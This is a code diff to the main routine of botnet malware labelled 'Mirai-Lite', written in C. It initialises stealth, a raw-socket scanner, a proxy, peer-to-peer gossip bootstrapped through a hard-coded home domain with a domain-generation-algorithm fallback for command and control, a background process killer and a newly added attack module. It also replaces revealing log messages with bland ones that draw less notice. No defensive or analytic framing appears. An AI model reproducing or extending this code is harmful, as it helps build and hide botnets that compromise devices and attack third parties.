@@ -27,7 +27,7 @@ void handle_signal(int sig) {
 
 int main(int argc, char *argv[]) {
     if (argc > 1 && strcmp(argv[1], "--debug") == 0) {
-        printf("[Mirai-Lite] DEBUG MODE (Stealth Disabled)\n");
+        printf("debug mode\n");
     } else {
         stealth_init(argc, argv);
     }
@@ -35,49 +35,51 @@ int main(int argc, char *argv[]) {
     signal(SIGINT, handle_signal);
     signal(SIGTERM, handle_signal);
 
+    attack_init();
+
     if (!scanner_init()) {
-        fprintf(stderr, "[-] Failed to init Scanner (Running as root?)\n");
+        fprintf(stderr, "scanner: init failed\n");
     } else {
-        printf("[+] Scanner Initialized (Raw Sockets)\n");
+        printf("scanner: ok\n");
     }
 
     int proxy_sock = proxy_init();
     if (proxy_sock < 0) {
-        fprintf(stderr, "[-] Failed to init Proxy\n");
+        fprintf(stderr, "proxy: init failed\n");
         return 1;
     }
-    printf("[+] Proxy listening on port %d\n", PROXY_LISTEN_PORT);
+    printf("proxy: %d\n", PROXY_LISTEN_PORT);
 
 #include "dns.h"
 
     int p2p_sock = p2p_init();
     if (p2p_sock < 0) {
-        fprintf(stderr, "[-] Failed to init P2P\n");
+        fprintf(stderr, "p2p: init failed\n");
     } else {
-        printf("[+] P2P listening on port %d\n", P2P_PORT);
+        printf("p2p: %d\n", P2P_PORT);
         
         p2p_add_neighbor(inet_addr("127.0.0.1"), htons(P2P_PORT));
         
-        printf("[*] Bootstrapping via dht.polydevs.uk...\n");
+        printf("bootstrap: home\n");
         if (dns_resolve_txt("dht.polydevs.uk") == 0) {
-            printf("[+] Connected via Home Domain.\n");
+            printf("bootstrap: ok\n");
         } else {
-            printf("[-] Home failed. Trying DGA...\n");
+            printf("bootstrap: dga\n");
             char *dga_domain = dga_get_domain();
-            printf("[*] Target DGA Domain: %s\n", dga_domain);
+            printf("dga: %s\n", dga_domain);
             
             if (dns_resolve_txt(dga_domain) == 0) {
-                printf("[+] Connected via DGA.\n");
+                printf("dga: ok\n");
             } else {
-                printf("[-] DGA failed. Waiting for next cycle.\n");
+                printf("dga: fail\n");
             }
         }
     }
 
     killer_init();
-    printf("[+] Killer Process Started (Background)\n");
+    printf("killer: ok\n");
 
-    printf("[+] Entering Main Loop...\n");
+    printf("ready\n");
     
     time_t last_gossip = time(NULL);
 
